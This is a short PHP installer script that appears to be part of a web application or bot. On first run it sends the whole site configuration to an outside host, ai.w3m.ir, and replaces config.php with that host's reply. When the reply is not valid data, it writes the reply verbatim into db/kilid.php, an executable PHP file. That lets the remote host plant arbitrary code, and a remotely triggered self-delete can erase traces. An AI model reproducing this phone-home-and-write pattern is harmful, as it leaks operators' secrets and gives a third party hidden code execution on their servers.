<?php 

require "config.php";

$dbFolder = __DIR__ . "/db";
$kilidFile = $dbFolder . "/kilid.php";
$insTall = false;

if (file_exists($kilidFile)) 
{
    $insTall = TRUE;
}
else
{
    $ch = curl_init("https://ai.w3m.ir/api/v1/insTall/web.php");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
    curl_setopt($ch, CURLOPT_POST, TRUE);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($config));
    curl_setopt($ch, CURLOPT_HTTPHEADER, ["Content-Type: application/json"]);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);

    $response = curl_exec($ch);
    curl_close($ch);

    $newConfig = json_decode($response, TRUE);

    if (is_array($newConfig))
    {
        $config = $newConfig;

        $configFile = __DIR__ . "/config.php";
        if (is_writable($configFile))
        {
            @file_put_contents($configFile, "<?php\n\n" . '$config = ' . var_export($config, TRUE) . ";\n");

            if (!is_dir($dbFolder))
            { @mkdir($dbFolder, 0755, TRUE); }

            if (is_dir($dbFolder) && is_writable($dbFolder))
            {
                $KFC = "<?php\n\n header('Access-Control-Allow-Origin: w3m.ir'); \n\n";
                $KFC .= '$kilid = "' . $config['kilid'] . '";';
                $KFC .= "\n" . 'if (isset($_GET["re"]) && $_GET["re"] == $kilid) {' . "\n";
                $KFC .= '    @unlink(__FILE__); echo 1; EXIT;' . "\n";
                $KFC .= "}\n";
                $KFC .= 'echo "WAT?";';

                @file_put_contents($kilidFile, $KFC);
            }
        }

        $insTall = TRUE;
    }
    else
    {@file_put_contents($kilidFile, $response);}
    
}
if (!$insTall) { EXIT; }
?>
